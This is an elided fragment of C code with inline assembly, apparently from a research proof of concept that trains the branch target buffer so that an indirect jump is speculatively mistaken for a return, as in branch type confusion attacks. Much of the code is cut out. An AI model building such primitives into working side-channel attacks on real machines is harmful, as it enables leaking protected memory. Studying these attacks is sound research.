...
mk_tmpl(btc_i_src,
        NOP15 NOP15 NOP2
            NOP15 NOP15 NOP2
        "pop %rax\n"
        "jmp *(%rdx)\n" // we going to confuse this branch to be a return.
);
...
static void inline init_segv_handler(void)
{
    struct sigaction sa;
...
int main(int argc, char *argv[])
{
    ...
    if (alloc_tmpl(&call_src, call_src, 0))
        err(1, "alloc_tmpl");
    if (alloc_tmpl(&btc_src, btc_ret_src, 0))
        err(1, "alloc_tmpl");
    if (alloc_tmpl(&spec_bti, spec_bti, 0))
        err(1, "alloc_tmpl");
    if (alloc_tmpl(&fin, fin, 0))
        err(1, "alloc_tmpl");
    ...
    *slow_fin_ptr = fin.ptr_u64;
    ...
    for (int i = 0; i < REPS; ++i)
    {
        ...
        // but now it's a ijmp
        memcpy(btc_src.ptr, btc_i_src__tmpl, tmpl_sz(btc_i_src));
        // we execute BTC-ret and if we land at the return target
        // we update the BTB.
        flush(slow_fin_ptr);
        call_src.fptr(btc_src.fptr, spec_bti.fptr, slow_fin_ptr);
